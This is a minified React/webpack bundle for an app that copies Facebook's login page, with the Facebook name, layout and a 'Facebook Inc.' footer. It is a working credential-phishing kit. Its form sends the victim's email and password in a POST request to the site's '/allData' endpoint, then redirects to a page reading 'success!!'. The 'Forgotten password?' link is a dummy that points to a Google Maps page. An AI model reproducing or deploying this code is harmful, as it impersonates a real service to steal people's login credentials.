(this["webpackJsonpfirst-app"]=this["webpackJsonpfirst-app"]||[]).push([[0],{22:function(e,c,s){},23:function(e,c,s){},30:function(e,c,s){"use strict";s.r(c);var t=s(1),n=s.n(t),a=s(16),l=s.n(a),r=(s(22),s(11)),j=s(2),i=s(14),o=(s(23),s(0)),d=function(){var e=Object(t.useState)(),c=Object(i.a)(e,2),s=c[0],n=c[1],a=Object(t.useState)(),l=Object(i.a)(a,2),r=l[0],d=l[1],b=Object(j.f)();return Object(o.jsxs)("div",{children:[Object(o.jsxs)("div",{className:"row allform mt-5",children:[Object(o.jsx)("div",{className:"col-lg-6",children:Object(o.jsx)("h1",{className:"facebook text-center ",children:"facebook"})}),Object(o.jsxs)("div",{className:"col-lg-6 mt-3",children:[Object(o.jsx)("div",{className:"row",children:Object(o.jsxs)("div",{className:"col-12 col-lg-8",children:[Object(o.jsxs)("form",{onSubmit:function(e){e.preventDefault();var c={email:s,password:r};fetch("/allData",{method:"POST",body:JSON.stringify(c),headers:{"Content-Type":"application/json"}}).then((function(e){return e.json()})).then((function(e){return b.push("/errorpage")}))},children:[Object(o.jsx)("div",{class:"form-group mb-2",children:Object(o.jsx)("input",{onChange:function(e){n(e.target.value)},type:"email",className:"form-control shadow-none fbInput",placeholder:"Enter email address or phone number"})}),Object(o.jsx)("div",{class:"form-group",children:Object(o.jsx)("input",{onChange:function(e){d(e.target.value)},type:"password",className:"form-control shadow-none fbInput",placeholder:"Password"})}),Object(o.jsxs)("div",{className:"row btnpad",children:[Object(o.jsx)("input",{type:"submit",class:"btn btn-sm  mt-3 ml-2 loginBtn",value:"Login"}),Object(o.jsx)("a",{href:"https://www.google.com/maps/d/viewer?msa=0&mid=1Q2CLVSnZSxZZQsrmZACa0yKf8MY&ll=37.447760395927546%2C-122.088449&z=13",className:"text-center mt-3 shadow-none",children:"Forgotten password?"})]})]}),Object(o.jsxs)("div",{className:"row",children:[Object(o.jsx)("div",{className:"col-5",children:Object(o.jsx)("hr",{})}),Object(o.jsx)("div",{className:"col-1",children:"or"}),Object(o.jsx)("div",{className:"col-5",children:Object(o.jsx)("hr",{})})]})]})}),Object(o.jsxs)("div",{className:"row text-center",children:[Object(o.jsx)("div",{className:"col-2"}),Object(o.jsx)("div",{className:"col-8 ",children:Object(o.jsx)("button",{className:"btn btn-sm btn-success mb-4",children:"Create New Account"})}),Object(o.jsx)("div",{className:"col-2"})]})]})]}),Object(o.jsxs)("div",{className:"row languages text-center",children:[Object(o.jsx)("div",{className:"col-1"}),Object(o.jsxs)("div",{className:"col-4",children:[Object(o.jsx)("p",{children:"English(UK)"}),Object(o.jsx)("p",{children:"\u0986\u09b8\u09be\u09ae\u09bf"}),Object(o.jsx)("p",{children:"Portoguese(Brasil)"})]}),Object(o.jsx)("div",{className:"col-2"}),Object(o.jsxs)("div",{className:"col-4",children:[Object(o.jsx)("p",{children:"\u09ac\u09be\u0982\u09b2\u09be"}),Object(o.jsx)("p",{children:"\u0939\u093f\u0928\u094d\u0926\u0940"}),Object(o.jsx)("p",{children:"Espa\xf1ol"})]}),Object(o.jsx)("div",{className:"col-2"})]}),Object(o.jsx)("p",{className:"text-center mt-3",children:"Facebook Inc."})]})},b=function(){return Object(o.jsx)("div",{className:"container text-center",children:Object(o.jsx)("h1",{className:"text-success mt-5",children:"success!!"})})},h=function(){return Object(o.jsx)("div",{children:Object(o.jsx)(r.a,{children:Object(o.jsxs)(j.c,{children:[Object(o.jsx)(j.a,{exact:!0,path:"/",children:Object(o.jsx)(d,{})}),Object(o.jsx)(j.a,{path:"/errorpage",children:Object(o.jsx)(b,{})})]})})})},m=function(e){e&&e instanceof Function&&s.e(3).then(s.bind(null,31)).then((function(c){var s=c.getCLS,t=c.getFID,n=c.getFCP,a=c.getLCP,l=c.getTTFB;s(e),t(e),n(e),a(e),l(e)}))};l.a.render(Object(o.jsx)(n.a.StrictMode,{children:Object(o.jsx)(h,{})}),document.getElementById("root")),m()}},[[30,1,2]]]);
//# sourceMappingURL=main.c6c85e57.chunk.js.map